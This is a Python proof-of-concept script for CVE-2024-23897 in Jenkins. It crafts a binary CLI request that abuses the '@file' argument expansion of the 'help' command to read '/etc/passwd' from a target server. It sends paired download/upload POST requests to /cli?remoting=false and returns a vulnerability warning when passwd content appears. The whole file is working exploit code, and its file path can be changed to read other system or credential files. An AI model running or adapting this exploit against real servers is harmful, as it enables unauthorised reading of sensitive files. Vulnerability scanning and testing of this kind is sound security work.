"""
@Author: exiashow
@File: jenkins_api_read_any_file.py
@Date: 2024/3/1 17:35
@Desc: CVE-2024-23897
@Summary:
"""

import threading
import http.client
import time
import uuid
import urllib.parse
import sys
import struct

class JenkinsApiReadAnyFile(object):
    def __init__(self, url, filepath="/etc/passwd"):
        self.url = url + ":8080"
        self.filepath = filepath

    def run(self):
        text_bytes = ('@' + self.filepath).encode('utf-8')
        length_prefix = struct.pack('>H', len(text_bytes))
        req_data = bytes([0]) + length_prefix + text_bytes

        data_bytes = b'\x00\x00\x00\x06\x00\x00\x04help\x00\x00\x00' + struct.pack('!B',
                                                                                   len(req_data) - 1) + req_data + b'\x00\x00\x00\x05\x02\x00\x03GBK\x00\x00\x00\x07\x01\x00\x05zh_CN\x00\x00\x00\x00\x03'
        target = urllib.parse.urlparse(self.url)
        uuid_str = str(uuid.uuid4())

        # print(f'REQ: {data_bytes}\n')

        response_data = []

        def req1():
            conn = http.client.HTTPConnection(target.netloc)
            conn.request("POST", "/cli?remoting=false", headers={
                "Session": uuid_str,
                "Side": "download"
            })
            response_data.append(conn.getresponse().read())

        def req2():
            time.sleep(0.3)
            conn = http.client.HTTPConnection(target.netloc)
            conn.request("POST", "/cli?remoting=false", headers={
                "Session": uuid_str,
                "Side": "upload",
                "Content-type": "application/octet-stream"
            }, body=data_bytes)

        t1 = threading.Thread(target=req1)
        t2 = threading.Thread(target=req2)

        t1.start()
        t2.start()

        t1.join()
        t2.join()

       # return response_data[0] if response_data else None

        try:
            for data in response_data:
                if b"/usr/sbin/nologin" in data:
                    return "[Warning] Jenkins vulnerability discovered: CVE-2024-23897"
                else:
                    return None
        except:
            pass


if __name__ == '__main__':
    fallingSword = JenkinsApiReadAnyFile(sys.argv[1])
    fallingSword.run()